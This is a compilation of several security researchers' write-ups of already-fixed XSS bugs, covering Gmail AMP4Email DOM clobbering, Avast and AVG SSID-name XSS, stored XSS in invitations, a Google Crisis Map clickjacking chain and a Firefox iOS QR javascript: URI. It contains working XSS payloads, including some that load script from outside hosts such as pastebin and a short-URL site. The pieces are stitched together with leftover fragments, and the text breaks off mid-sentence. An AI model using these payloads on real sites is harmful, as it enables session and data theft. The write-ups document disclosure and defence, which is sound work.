Here’s the full content:\n\nXSS in GMail's AMP4Email via DOM Clobbering - research.securitum.com Skip to content research.securitum.com securitum.com vulnerabilities researches and cyber security education publications Primary Menu Research blog Penetration Testing Contact us About us XSS in GMail’s AMP4Email via DOM Clobbering Michał Bentkowski | November 18, 2019 November 18, 2019 | Research This post is a write up of an already-fixed XSS in AMP4Email I reported via Google Vulnerability Reward Program in August 2019. The XSS is an example of a real-world exploitation of well-known browser issue called DOM Clobbering. What is AMP4Email AMP4Email (also known as dynamic mail) is a new feature of Gmail that makes it possible for emails to include dynamic HTML content. While composing emails containing HTML markup has been done for years now, it’s been usually assumed that the HTML contains only static content, i.e. some kind of formatting, images etc. without any scripts or forms. AMP4Email is meant to go one step further and allow dynamic content in emails. In a post in Google official G Suite blog , the use caes for dynamic mails are nicely summarized: With dynamic email, you can easily take action directly from within the message itself, like RSVP to an event, fill out a questionnaire, browse a catalog or respond to a comment. Take commenting in Google Docs, for example. Instead of receiving individual email notifications when someone mentions you in a comment, now, you’ll see an up-to-date thread in Gmail where you can easily reply or resolve the comment, right from within the message. The feature raises some obvious security questions; the most important one probably being: what about Cross-Site Scripting (XSS)? If we’re allowing dynamic content in emails, does that mean that we can easily inject arbitrary JavaScript code? Well – no; it’s not that easy. AMP4Email has a strong validator which, in a nutshell, is a strong whitelist of tags and attributes that are allowed in dynamic mails. You can play around with it on https://amp.gmail.dev/playground/ , in which you can also send a dynamic email to yourself to see how it works! Fig 1. AMP4Email playground If you try to add any HTML element or attribute that is not explicitly allowed by the validator, you’ll receive an error. Fig 2. AMP Validator disallows arbitrary script tags When playing around with AMP4Email and trying various ways to bypass it, I noticed that id attribute is not disallowed in tags (Fig 3). Fig 3. Attribute id is not disallowed This looked like a fine place to start the security analysis, since creating HTML elements with user-controlled id attribute can lead to DOM Clobbering . DOM Clobbering DOM Clobbering is a legacy feature of web browsers that just keeps causing trouble in many applications. Basically, when you create an element in HTML (for instance <input id=username> ) and then you want wish to reference it from JavaScript, you would usually use a function like document.getElementById('username') or document.querySelector('#username') . But these are not the only ways! The legacy way is to just access it via a property of global window object. So window.username is in this case exactly the same as document.getElementById('username') ! This behaviour (which is known as DOM Cloberring) can lead to interesting vulnerabilities if the application makes decisions based on existence of certain global variables (imagine: if (window.isAdmin) { ... } ). For further analysis of DOM Clobbering, suppose that we have the following JavaScript code: Python if (window.test1.test2) { eval(''+window.test1.test2) } 1 2 3 if ( window . test1 . test2 ) { eval ( '' + window . test1 . test2 ) } and our job is to evaluate arbitrary JS code using only DOM Clobbering techniques. To solve the task, we need to find solutions to two problems We know that we can create new properties on window , but can we create new properties on other objects (the case of test1.test2 )? Can we control how our DOM elements are casted to string? Most HTML elements, when casted to string, returns something similar to [object HTMLInputElement] . Let’s begin with the first problem. The way to solve it that is most commonly referenced is to use <form> tag. Every <input> descendent of the <form> tag is added as a property of the <form> with the name of the property equal to the name attribute of the <input> . Consider the following example: Python <form id=test1> <input name=test2> </form> <script> alert(test1.test2); // alerts \"[object HTMLInputElement]\" </script> 1 2 3 4 5 6 < form id = test1 > < input name = test2 > < / form > <script> alert ( test1 . test2 ) ; // alerts \"[object HTMLInputElement]\" </script> To solve the second problem, I’ve created a short JS code that iterates over all possible elements in HTML and checks whether their toString method inherits from Object.prototype or are defined in another way. If they don’t inherit from Object.prototype , then probably something else than [object SomeElement] would be returned. Here’s the code: Python Object.getOwnPropertyNames(window) .filter(p => p.match(/Element$/)) .map(p => window[p]) .filter(p => p && p.prototype && p.prototype.toString !== Object.prototype.toString) 1 2 3 4 Object . getOwnPropertyNames ( window ) . filter ( p = > p . match ( / Element $ / ) ) . map ( p = > window [ p ] ) . filter ( p = > p && p . prototype && p . prototype . toString ! == Object . prototype . toString ) The code returns two elements: HTMLAreaElement ( <area> ) and HTMLAnchorElement ( <a> ). The first one is disallowed in AMP4Email so let’s focus only on the second one. In case of <a> element, toString returns just a value of href attribute. Consider the example: Python <a id=test1 href=https://securitum.com> <script> alert(test1); // alerts \"https://securitum.com\" </script> 1 2 3 4 < a id = test1 href = https : // securitum . com > <script> alert ( test1 ) ; // alerts \"https://securitum.com\" </script> At this point, it may seem that if we want to solve the original problem (i.e. evaluate value of window.test1.test2 via DOM Clobbering), we need a code similar to the following: Python <form id=test1> <a name=test2 href=\"x:alert(1)\"></a> </form> 1 2 3 < form id = test1 > < a name = test2 href = \"x:alert(1)\" > < / a > < / form > The problem is that it doesn’t work at all; test1.test2 would be undefined . While <input> elements do become properties of <form> , the same doesn’t happen with <a> . There’s an interesting solution to this problem, though, that works in WebKit- and Blink-based browsers. Let’s say that we have two elements with the same id : Python <a id=test1>click!</a> <a id=test1>click2!</a> 1 2 < a id = test1 > click ! < / a > < a id = test1 > click2 ! < / a > So what we’re going to get when accessing window.test1 ? I’d intuitively expect getting the first element with that id (this is what happens when you try to call document.getElementById('#test1') . In Chromium, however, we actually get an HTMLCollection ! Fig 4. window.test1 points to HTMLCollection What is particularly interesting here (and that can be spotted in fig. 4) is that the we can access specific elements in that HTMLCollection via index ( 0 and 1 in the example) as well as by id . This means that window.test1.test1 actually refers to the first element. It turns out that setting name attribute would also create new properties in the HTMLCollection . So now we have the following code: Python <a id=test1>click!</a> <a id=test1 name=test2>click2!</a> 1 2 < a id = test1 > click ! < / a > < a id = test1 name = test2 > click2 ! < / a > And we can access the second anchor element via window.test1.test2 . Fig 5. We can make window.test1.test2 defined So going back to the original exercise of exploiting eval(''+window.test1.test2) via DOM Clobbering, the solution would be: Python <a id=\"test1\"></a><a id=\"test1\" name=\"test2\" href=\"x:alert(1)\"></a> 1 < a id = \"test1\" > < / a > < a id = \"test1\" name = \"test2\" href = \"x:alert(1)\" > < / a > Let’s now go back to AMP4Email to see how DOM Clobbering could be exploited in a real-world case. Exploiting DOM Clobbering in AMP4Email I’ve already mentioned that AMP4Email could be vulnerable to DOM Clobbering by adding my own id attributes to elements. To find some exploitable condition, I decided to have a look at properties of window (Fig 6). The ones that immediately caught attention were beginning with AMP . Fig 6. Properties of window global object At this point, it turned out that AMP4Email actually employs some protection against DOM Clobbering because it strictly forbids certain values for id attribute, for instance: AMP (Fig 7.). Fig 7. AMP is an invalid value for id in AMP4Email The same restriction didn’t happen with AMP_MODE , though. So I prepared a code <a id=AMP_MODE> just to see what happens… … and then I noticed a very interesting error in the console (Fig 8). Fig 8. 404 on loading certain JS file As seen in fig 8., AMP4Email tries to load certain JS file and fails to do so because of 404. What is particularly eye-catching, however, is the fact that there’s undefined in the middle of the URL ( https://cdn.ampproject.org/rtv/ undefined /v0/amp-auto-lightbox-0.1.js ). There was just one plausible explanation why this happens I could come up with: AMP tries to get a property of AMP_MODE to put it in the URL. Because of DOM Clobbering, the expected property is missing, hence undefined . The code responsible for the code inclusion is shown below: Python f.preloadExtension = function(a, b) { \"amp-embed\" == a && (a = \"amp-ad\"); var c = fn(this, a, !1); if (c.loaded || c.error) var d = !1; else void 0 === c.scriptPresent && (d = this.win.document.head.querySelector('[custom-element=\"' + a + '\"]'), c.scriptPresent = !!d), d = !c.scriptPresent; if (d) { d = b; b = this.win.document.createElement(\"script\"); b.async = !0; yb(a, \"_\") ? d = \"\" : b.setAttribute(0 <= dn.indexOf(a) ? \"custom-template\" : \"custom-element\", a); b.setAttribute(\"data-script\", a); b.setAttribute(\"i-amphtml-inserted\", \"\"); var e = this.win.location; t().test && this.win.testLocation && (e = this.win.testLocation); if (t().localDev) { var g = e.protocol + \"//\" + e.host; \"about:\" == e.protocol && (g = \"\"); e = g + \"/dist\" } else e = hd.cdn; g = t().rtvVersion; null == d && (d = \"0.1\"); d = d ? \"-\" + d : \"\"; var h = t().singlePassType ? t().singlePassType + \"/\" : \"\"; b.src = e + \"/rtv/\" + g + \"/\" + h + \"v0/\" + a + d + \".js\"; this.win.document.head.appendChild(b); c.scriptPresent = !0 } return gn(c) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 f . preloadExtension = function ( a , b ) { \"amp-embed\" == a && (a = \"amp-ad\"); var c = fn ( this , a , ! 1 ) ; if ( c . loaded | | c . error ) var d = ! 1 ; else void 0 === c . scriptPresent && (d = this.win.document.head.querySelector('[custom-element=\"' + a + '\"]'), c.scriptPresent = !!d), d = !c.scriptPresent; if ( d ) { d = b ; b = this . win . document . createElement ( \"script\" ) ; b . async = ! 0 ; yb ( a , \"_\" ) ? d = \"\" : b . setAttribute ( 0 < = dn . indexOf ( a ) ? \"custom-template\" : \"custom-element\" , a ) ; b . setAttribute ( \"data-script\" , a ) ; b . setAttribute ( \"i-amphtml-inserted\" , \"\" ) ; var e = this . win . location ; t ( ) . test && this.win.testLocation && (e = this.win.testLocation); if ( t ( ) . localDev ) { var g = e . protocol + \"//\" + e . host ; \"about:\" == e . protocol && (g = \"\"); e = g + \"/dist\" } else e = hd . cdn ; g = t ( ) . rtvVersion ; null == d && (d = \"0.1\"); d = d ? \"-\" + d : \"\" ; var h = t ( ) . singlePassType ? t ( ) . singlePassType + \"/\" : \"\" ; b . src = e + \"/rtv/\" + g + \"/\" + h + \"v0/\" + a + d + \".js\" ; this . win . document . head . appendChild ( b ) ; c . scriptPresent = ! 0 } return gn ( c ) } While it is not particularly difficult to read, below is shown a manually deobfuscated form of the code (with some parts being omitted for clarity): Python var script = window.document.createElement(\"script\"); script.async = false; var loc; if (AMP_MODE.test && window.testLocation) { loc = window.testLocation } else { loc = window.location; } if (AMP_MODE.localDev) { loc = loc.protocol + \"//\" + loc.host + \"/dist\" } else { loc = \"https://cdn.ampproject.org\"; } var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \"/\" : \"\"; b.src = loc + \"/rtv/\" + AMP_MODE.rtvVersion; + \"/\" + singlePass + \"v0/\" + pluginName + \".js\"; document.head.appendChild(b); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var script = window . document . createElement ( \"script\" ) ; script . async = false ; var loc ; if ( AMP_MODE . test && window.testLocation) { loc = window.testLocation } else { loc = window.location; } if ( AMP_MODE . localDev ) { loc = loc . protocol + \"//\" + loc . host + \"/dist\" } else { loc = \"https://cdn.ampproject.org\" ; } var singlePass = AMP_MODE . singlePassType ? AMP_MODE . singlePassType + \"/\" : \"\" ; b . src = loc + \"/rtv/\" + AMP_MODE . rtvVersion ; + \"/\" + singlePass + \"v0/\" + pluginName + \".js\" ; document . head . appendChild ( b ) ; So, in line 1, the code creates a new script element. Then, checks whether AMP_MODE.test and window.testLocation are both truthy. If they are, and also AMP_MODE.localDev is truthy (line 11), then window.testLocation is being used as a base for generating the URL of the script. Then, in lines 17 and 18 some other properties are concatenated to form the full URL. While it may not be obvious at the first sight, because of how the code is written and thanks to DOM Clobbering, we can actually control the full URL. Let’s assume that AMP_MODE.localDev and AMP_MODE.test are truthy, to see how the code simplifies even more: Python var script = window.document.createElement(\"script\"); script.async = false; b.src = window.testLocation.protocol + \"//\" + window.testLocation.host + \"/dist/rtv/\" + AMP_MODE.rtvVersion; + \"/\" + (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \"/\" : \"\") + \"v0/\" + pluginName + \".js\"; document.head.appendChild(b); 1 2 3 4 5 6 7 8 9 10 var script = window . document . createElement ( \"script\" ) ; script . async = false ; b . src = window . testLocation . protocol + \"//\" + window . testLocation . host + \"/dist/rtv/\" + AMP_MODE . rtvVersion ; + \"/\" + ( AMP_MODE . singlePassType ? AMP_MODE . singlePassType + \"/\" : \"\" ) + \"v0/\" + pluginName + \".js\" ; document . head . appendChild ( b ) ; Do you remember our earlier exercise of overloading window.test1.test2 with DOM Clobbering? Now we need to do the same, only overload window.testLocation.protocol . Hence the final payload: Python <!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--> <a id=\"AMP_MODE\"></a> <a id=\"AMP_MODE\" name=\"localDev\"></a> <a id=\"AMP_MODE\" name=\"test\"></a> <!-- window.testLocation.protocol is a base for the URL --> <a id=\"testLocation\"></a> <a id=\"testLocation\" name=\"protocol\" href=\"https://pastebin.com/raw/0tn8z0rG#\"></a> 1 2 3 4 5 6 7 8 9 < ! -- We need to make AMP_MODE . localDev and AMP_MODE . test truthy -- > < a id = \"AMP_MODE\" > < / a > < a id = \"AMP_MODE\" name = \"localDev\" > < / a > < a id = \"AMP_MODE\" name = \"test\" > < / a > < ! -- window . testLocation . protocol is a base for the URL -- > < a id = \"testLocation\" > < / a > < a id = \"testLocation\" name = \"protocol\" href = \"https://pastebin.com/raw/0tn8z0rG#\" > < / a > Actually, the code didn’t execute in the real-world case because of Content-Security-Policy deployed in AMP: Python Content-Security-Policy: default-src 'none'; script-src 'sha512-oQwIl...==' https://cdn.ampproject.org/rtv/ https://cdn.ampproject.org/v0.js https://cdn.ampproject.org/v0/ 1 2 3 4 5 Content - Security - Policy : default - src 'none' ; script - src 'sha512-oQwIl...==' https : // cdn . ampproject . org / rtv / https : // cdn . ampproject . org / v0 . js https : // cdn . ampproject . org / v0 / I didn’t find a way to bypass the CSP, but when trying to do so, I found an interesting way of bypassing dir-based CSP and I tweeted about it (later it turned out that the same trick was already used in a CTF in 2016 ). Google in their bug bounty program, don’t actually expect bypassing CSP and pay a full bounty anyway. It was still an interesting challenge; maybe someone else will find way to bypass 🙂 Summary In the post, I’ve shown how DOM Clobbering could be used to perform an XSS if certain conditions are met. It was surely an interesting ride! If you wish to play around with these kind of XSS-es, have a look at my XSS Challenge , which was based on this very XSS.

I understood that how the application works. After understanding, I logged out of the application and tried to visit the paths that are only available to logged-in users. As soon as I hit the first path in my list, I was redirected to “/login?redirect_to=%2fsettings”. And Open-redirect vulnerability clicked into my mind and I was successful to get a redirect to https://google.com/ by visiting https://www.example.com/login?redirect_to=https%3A%2f%2fgoogle.com%2f and logging in to www.example.com Then, I tried to get XSS by visiting https://www.example.com/login?redirect_to=javascript%3Aalert(1) and got that alert popup.

CVE-2019–18653 & CVE-2019–18654: The story when Reflected XSS was triggered from the SSID Name (It also affected AVG AntiVirus because basically the product codes were mostly “merged”). YoKo Kho 9 min read · Oct 29, 2019 -- 1 Listen Share بسم الله الرحمن الرحيم So, this article will be explained in two ways, which are the one that tells how I got it and the one that tries to explain the basic and reference . Readers could also read the TL;DR section directly. I. TL;DR 1.1. Create an SSID Name with a simple XSS Payload (with maximum = 32 characters). We can use BruteLogic and s0md3v short XSS payload (thanks man!). 1.2. Connect your Windows OS (with Avast AntiVirus installed and active) to the SSID and wait for the Avast Network Notification Feature to trigger the XSS payload. Press enter or click to view image in full size Triggering the XSS via SSID Name 1.3. Report it to Avast and confirmed as a valid issue in about 2 days. And a few months later, they judged whether the issue was rather serious and decided to reward the report with $5000. II. Behind the Scene about How I got this Issue A few years ago, I read a good article from one of the bug hunters when he just got a lot of XSS issues in some big companies by putting XSS payload on his SSID name (I really lost the bookmark for one reason). In short, when he surfs to many applications, he gets many applications that reflect the value of his SSID name (and XSS is triggered). From there, then I started using XSS payload as my SSID name (on OS X). So, a few months ago, I got a notebook (with windows in it) from the office where I was working at that time. I installed everything I needed from the tethering connection and left Avast AntiVirus for the last (at home). At home, I continued the installation and everything went well. Until one day I use this notebook again for training purposes. In the middle of training (day 3 or day 4), In the middle of training (day 3 or day 4), I had a problem with the used connection. So, suddenly this notebook connects to my tethering connection automatically (with Avast already installed), and within seconds, I get a pop-up warning with “ https://local.avast.com ” appearing on my desktop. To be honest, I don’t know how it works. Lucky for me, there was a video recording in class and I asked to copy a conversation between this time period. Trying to find out how that happened, I finally got an answer the next day. That XSS is triggered because the embedded “ Network Notification Feature ” (Firewall) in Avast (specifically for Internet Security and Premiere Edition) reflects the SSID name and has not been sanitized yet. Then I made a report that night, and got a reply about 2 days confirming whether the issue was valid. III. Abstract As quoted from Avast’s official site, Avast as one of the largest security companies in the world that using next-gen technologies to fight cyber-attacks in real time, is dedicated to creating a world that provides safety and privacy for all, no matter who you are, where you are, or how you connect. With so much research done by Avast, Avast tries to achieve the best endpoint protection for every user. One feature that has been embedded is the “ Firewall ” feature that can be used easily to manage incoming and outgoing traffic. By default, this Firewall feature can give users a warning (pop-up notification) when they are connected to a new network . For example, like the image shown below, this shows that the user has just connected to a wireless network with “My Hotspot” as the SSID name. Press enter or click to view image in full size Popup Notification when Connected to new Network After the popup appears, the user can choose the type of network from the SSID they are connecting to, such as a “ Private ” network or a “ Public ” network. However, a problem arises when this notification popup does’t filter out special characters that are reflected from the SSID name. In other words, an attacker can trigger XSS on a client through “ popup notifications ” by using the malicious SSID name. IV. Introduction 4.1. Cross Site Scripting (XSS) To put it simply, this kind of vulnerability is a vulnerability that could “let” an Attacker to be able to execute a code in the input section that hasn’t implemented filtering for special characters such as “ > < : / ; etc. In contrast to Stored XSS that “saves” the executed code, Reflected XSS actually doesn’t save this script at all, so the “target” is expected and required to visit the URL that has been “injected” by additional contents from an Attacker. In this situation, Avast has reflected the input (from the SSID Name) into the popup notification (each time the user changes the connection). When the SSID name contains client-side scripts (such as javascript), notifications will trigger scripts that can trigger XSS vulnerabilities. One good thing, even the SSID name has a limit of around 32 characters, we can still cut it off by calling a short URL. Credits to Brute Logic and S0md3v , Thanks man! 4.1.1. The Short XSS Payload The first time I got a popup warning, I didn’t know how to trigger it further. Then Alhamdulillah, I was very lucky because I remembered reading a publication made by “ Brute Logic ” and “ S0md3v ” related the short XSS Payload. And the cool thing is, it works! If you are looking for great and creative XSS payloads, then I recommend both of these researches: • https://brutelogic.com.br/blog/shortest-reflected-xss-possible/ • https://github.com/s0md3v/AwesomeXSS And yes (of course), there are plenty of researchers out there who still share other great and creative payload that you can follow. 4.2. Research Story related things that could be Executed by using the Malicious SSID Name As explained earlier, I realized this trick from writing released by one of the bug hunters (I’m very sorry, I really lost my bookmark because of one thing). From his research, I finally learned that research in this field was carried out in great detail in the 2013 by Deral Heiland. He has published the research at BlackHat Europe 2013 . So, for research and in-depth knowledge about this, you can refer to his presentation. Very recommended. 4.3. Affected Version and Testing Environment Avast: The affected version of this vulnerability could be found at Avast Internet Security version 19.3.2369 (build 19.3.4241.440) . It also affects the Avast Free Antivirus the premiere one. And from the AVG side: the issue was affects the AVG Internet Security version 19.3.3084 (build 19.3.4241.440). As a little note, both of issue has been reproduced at the Windows 10 environment (latest patch — per March 22nd, 2019). V. Summary of Issue As explained earlier, the security problem in this report is a vulnerability that can allow an Attacker to trigger XSS on the client through “popup notifications” using the malicious SSID name. In this situation, the Attacker can also display a fake login page (for example with the Avast / AVG logo) via “popup notifications” and the user will not feel suspicious because there is no URL that can be seen / detected when the script triggers a fake login page. Press enter or click to view image in full size Sample Case to Triggering the Fake Login Page - Avast Press enter or click to view image in full size Sample Case to Triggering the Fake Login Page - AVG VI. Proof of Concept To complete the explanation, there are few things that must be done to reproduce this issue. Here are the steps that need to be prepared: 6.1. Create SSID with simple JavaScript as the name of the SSID. For example: ><img src=x onerror=prompt(1)> The basic purpose of using this script is to trigger a popup warning with “1” as a character. 6.2. Make sure if the victim is connected to the SSID that was prepared; 6.3. After the victim is connected to the SSID that is prepared, then wait a few seconds. A pop-up notification will be displayed, and the script will be triggered: Press enter or click to view image in full size The Script has been Triggered via Notification Popup - Avast Press enter or click to view image in full size The Script has been Triggered via Notification Popup - AVG 6.4. Because the SSID name is limited to 32 characters, we must trick the script by using the short URL service. For example, we try to trigger login forms from other portals.. The used script is: ><embed src=//tiny.cc/XYZABCX> (you also could use bit.ly). Press enter or click to view image in full size Triggering the Login Form from other Portal to Notification Popup Press enter or click to view image in full size Triggering the Login Form from other Portal to Notification Popup II And the good thing is, you can also trigger scripts from other external URLs (credits to s0md3v). Here is an example: ><embed src=//14.rs> Press enter or click to view image in full size Triggering the script by Using the External Script VII. Additional Information To complete the explanation, here is a simple PoC video that can be seen about this: PoC Video - Triggering the XSS Payload via SSID Name VIII. Reporting Timeline Mar 21st, 2019: Found the issue and don’t know the root cause yet; Mar 22nd, 2019: Found the problem, then create and send the report via bugs@avast.com; Mar 25th, 2019: Send the information if AVG is affected too; Mar 25th, 2019: Avast replied and confirmed the bug. They said if they will release a fix soon; Mar 25th, 2019: Avast replied if that not surprising (if AVG was affect with the same issue). They give a high level explanation nicely. May 24th, 2019: Avast said if the issue was fixed (in Avast 19.4) and already release. They also said if they will give more details when the reward is decided. June 12th, 2019: Avast judged this issue to be rather serious and decided to reward the report with $5000. (Really amazing). Press enter or click to view image in full size Reward Decision from Avast This one really broke the record I had in one reward payment. Also, that decision really surprised me. At that time, I still didn’t believe until the numbers actually came into my Paypal account. For Avast: Thank you very much for the surprising reward and amazing program! Greatly appreciated. I have lost my words to thanking them. Oct 30th, 2019: CVE-2019–18653 has been assigned for issue at Avast and CVE-2019–18654 has been assigned for issue at AVG. IX. The Closing Well, as can be seen by the reader, this is something I never imagined (triggering XSS on the Desktop App). Some simple notes that I might be able to share (with my limited knowledge) are: Always try to bookmark everything you read. Put notes and comeback when you want to use those tricks for your target. In this case, one day I read and saved a publication made by Brute Logic and s0md3v. When I meet a difficult situation (for example triggering XSS with limited characters), I return to their write-up and open my notes. Even though it looks silly, it would be better if you enter your SSID name with (for example) Payload XSS. I have placed it for several years (since the first time I read the article published by a bug hunter out there, thank you!), But I found it was triggered in 2019 on Desktop Applications on Windows OS (does’t affect the OS X version of Avast). Also, another vector that I learned from this is: XSS through malicious SSID Names can also be triggered for the one that reflecting or storing our SSID name at the App. In this case, Avast and AVG has reflecting the SSID Name. Apart from the desktop one, just please kindly don’t forget about the XSS that could also be triggered by Web or Mobile Application that reflecting the SSID Name. At the other side, I also have learnt if the one that stored the SSID Name could also be vulnerable. At least, I have saw it at few write-ups such as: • [CVE-2019–11877] Credentials Stealing Through XSS on Pix-Link Repeater • [CVE-2017–14219] XSS in Intelbras Router WRN 240 — Getting Wireless Password and Administrator Session Without Being Connected on the Same Network • [CVE-2018–17337] XSS via SSID at N.Plug Wireless Repeater version 1.0.0.14 X.

Press enter or click to view image in full size Press enter or click to view image in full size So, let’s imagine that we have a Web Application “ WA ”, that allows you to create users , companies and invite users to the company . The functional of inviting worked like this — the user received a letter in the mail, where it was said: “ You were invited to join company Hackerman. Accept invite [link]” As the site allowed us to name of company contain “<> etc — I put the name of company as: And you know what… I got such invite on email: So I got such things earlier, and in principle… we can already report at this point, since this allows us to generate HTML messages by mail and send on behalf of the web application. (I used to find such a vulnerability on the site of one mobile giant, there we could change some parameters in the post request for registration, and then the link to confirm the account came with a broken HTML). But… I sat on the site a little more and found that the site has internal notifications that you were invited — and when you go to the notification page — a window appears that says about the invitation. And you know what? They also did not filter html on this page :)))))) Sooo, lets register comapany a”><svg\\onload=alert(1)> and — for all the users that we invite — they receive notifications about the invitation, thereby activating the Stored XSS. Press enter or click to view image in full size And after reporting and confirmation of vulnerability — a team member wrote to me that the problem with the email is a duplicate, but the previous hacker didn’t say anything about the Stored XSS! It’s a pity, because it turns out he missed such functionality and such critical vulnerability :( While I was writing this WriteUp, I suddenly started to feel sorry for myself too — I remembered the #bugbountytips from intigrity — and there was a picture like “Found SSRF — exploit RCE, found Self-XSS — exploit Stored XSS with the help of CSRF, Found Stored XSS — exploit Account Takeover”. And only now I realized that I could work a little more and get much more, even P1. I hope you do not repeat my mistakes, always take the maximum impact from any vulnerability!

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nClickjacking DOM XSS on Google.org - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me Clickjacking DOM XSS on Google.org by Thomas Orlita Vulnerabilities August 12, 2019 June 10, 2022 One of the lesser-known Google projects is Google Crisis Map . It was created to help people find and use critical emergency information. [source] Although it is still working, it doesn’t seem to be used much anymore. Since it’s an older project (created in 2012) and not updated often, it’s a great target to look for vulnerabilities. It’s hosted on the google.org domain, which doesn’t have as big a severity as google.com (for client-side vulnerabilities), but it’s still a domain owned by Google. Logging in If you go to the project’s home page ( google.org/crisismap ), you’ll get redirected to the default map “Weather and Events”. This isn’t very interesting for us since the only thing we can do is view the map. There is a way to manage and create new maps. It can be accessed if we add .maps at the end of the URL: google.org/crisismap/.maps Once you open this page, you’ll need to log in with your Google account to continue. Now you should see a dashboard with a list of maps. There are three default maps for every account. For some reason, if you publish one of these maps on your own domain, everyone will see that in the dashboard under the “Published Map” field. Creating a map If you click on the red “Create Map” button, you’ll most likely see a message that the gmail.com domain can’t be used for creating new maps. This means we need to log in using an email with our custom domain. We can do this either by logging in with a GSuite account or an email that uses a domain other than gmail.com. After that, we can create a new map. After clicking the “Continue” button, we’ll get redirected to a page where we can edit the newly created map. Finding the XSS First, we’ll add a new layer to the map. A dialog for creating a new layer will pop up. We’ll enter anything as the “Title”. Now if we enter javascript:alert(document.domain) into the “Source URL” field, it’ll show an error: Invalid URL – please include a protocol (e.g. http:// or https://) This means it checks if the URL is valid before it allows you to save the new layer. The deobfuscated JavaScript code that validates the URL looks like this: if (url && !url.toLowerCase().match(\"^\\\\s*(http://|https://|docs://|$)\")) { showError(\"Invalid URL - please include a protocol (e.g. http:// or https://)\"); } But this is only validation on the client-side before the actual save request is sent to the backend. Modifying the request We can use a web debugging proxy like Fiddler or Burp Suite to modify the request and send the modified version instead. First, we need to change the “Source URL” to a valid URL, e.g. https://example.com . We’ll click the “OK” button and click “Save” to send the save request. Then we’ll modify the request. This is what the request looks like: POST https://google.org/crisismap/.api/maps/1234 { \"id\": \"1234\", \"title\": \"Untitled map\", \"base_map_type\": \"GOOGLE_ROADMAP\", \"layers\": [{ \"id\": \"1\", \"title\": \"Test layer\", \"visibility\": \"DEFAULT_ON\", \"type\": \"KML\", \"source\": { \"kml\": { \"url\": \"https://example.com\" } } }] } We’ll replace https://example.com with javascript:alert(document.domain) and send this modified request. Testing the XSS The request is now sent and saved, so we’ll reload the page. Open “Layers” and click on “Download KML”. After we click on the download link, the XSS is fired and the alert box pops up with the domain name! How to fix this Why did this happen? The URL validation happened only on the frontend and not in the backend. That means this could be fixed by validating the URL in the backend as well. But this is not the way Google decided to fix it. Instead of checking the URL when saving it in the backend, the URL is now validated before displaying in the DOM. So if the URL isn’t valid, it won’t be used as the link. It’ll use a meaningless value like about:invalid instead. <a href=\"about:invalid#zClosurez\">Download KML</a> The impact Okay, so we have a link that points to a javascript: URI containing the payload. The link is on a page to manage the map. And you must log in and have permission to access the page. Clearly, this is self-XSS since only we are able to get this XSS executed. Now how do we get from self-XSS to a real XSS? Increasing the severity Every map we create can be published to be viewed by the public. If you’re logged in via an email with the domain example.com , you can publish the map to the URL https://google.org/crisismap/example.com/test . Anyone can open this URL and view the map we’ve created. To get the XSS working, the user would have to open or be navigated to this page, open the “Layers” view and then click the “Download KML” link. This means it’d no longer be self-XSS, but it’s still too many steps the user would have to make for this XSS to be useful. Clickjacking If we take a look at the response HTTP headers, we can see that google.org doesn’t send the X-Frame-Options header. Response headers from google.org Response headers from google.com The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> , <iframe> , <embed> or <object> . Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites. — MDN web docs The (intentional) lack of this HTTP header on google.org means we can embed the published map into an iframe on our own website. <iframe src=\"https://google.org/crisismap/example.com/test\"></iframe> This is how it’ll look like. In order to fire the XSS the user now doesn’t have to even leave our website. But they’d still need to click on two places in the iframe (“ Layers ” > “ Download KML “). The iframe is loaded on our website – that means we can use CSS and JavaScript to manipulate it. The first thing that came to my mind was to put black DIVs around the point where we want the user to click. Then detect a click and move the DIV to the second point. This worked well but it still requires the user to click on two different locations. But a more efficient solution would be to position the iframe absolutely with CSS so the user doesn’t have to move the cursor at all. Below is was a live demo. Unfortunately, Google Crisis Map has been discontinued so the live demo won’t work anymore. You can see how it looked like in the video . It scales the iframe 50× and moves it to the position we want the user to click. First to the “Layers” tab. After a click, it moves over the link with the payload. It was possible to execute the XSS by clicking two times somewhere in the iframe . We could even overlay the iframe with an opaque div with pointer-events disabled, so the user would have no idea they are clicking in the iframe. For the sake of the sample and the fact that this vulnerability is already fixed, the link goes to https:// and not javascript: URI. Conclusions There are several things to be taken from here. Never trust user input. Always check (on the backend) if it’s valid before saving it. Make sure to properly sanitize it depending on the context it will be in. Don’t allow other domains to embed your website in an iframe by correctly setting the X-Frame-Options header. When looking for vulnerabilities, try to find the highest possible severity of the vulnerability. For example, if you find an XSS, try making it into an account takeover by finding incorrectly configured cookies or endpoints. Don’t be afraid to look for older projects that still fit into the scope of the Bug Bounty program.

And hence QR code scanner comes handy. You just need to scan a QR code and you will be redirected to specified URL or the fetched information will be displayed on your screen. Almost every one of us uses random QR codes at so many places, but have you ever wondered what could go wrong if the trusted QR scanner software not implemented correctly? According to this tweet by firefox QR scanner is supported in firefox since version 10 Firefox IOS use WebKit web view to render the content and rest of the part is written in SWIFT by firefox that means the rest of the part comes under the firefox bug bounty program. Here is a quick image that shows how we can use QR for the navigation So what could go wrong? As an evil mind, the first strategy is to always look for the different javascript URI navigation patterns, and hence the first idea is to check what would happen if instead of the URL we make a QR code with javascript URI? Will the browser treat them like normal text? or it will execute as javascript code? Let’s figure it out. Now, all we need is a website that can generate QR code based on our input I found this website https://www.the-qrcode-generator.com/ pretty easy. Next, let’s navigate to free text section of the site and generate a QR code with javascript URI. javascript:fetch('/').then(res=>res.text()).then(data=>alert(data)); It could be more simple in the following way javascript:alert(document.body.innerHTML); But i like fetch API. The above code will try to fetch the source of last visited domain by the user. Let’s suppose our user is on google.com After he decided to navigate to another address by scanning the QR code. so in this case as soon as the user scans the QR code source of the current domain will be prompted to the user since firefox evaluated the javascript URI . Now people who scan random QR code on random websites can think of the different consequences. Since we have javascript code execution on the current domain, we can steal user’s data, cookies and what not! So If you are thinking this is limited to the web address you might be wrong! Let’s explore other places The first thing that came to my mind is the browser’s reader mode XSS In Reader Mode A reader 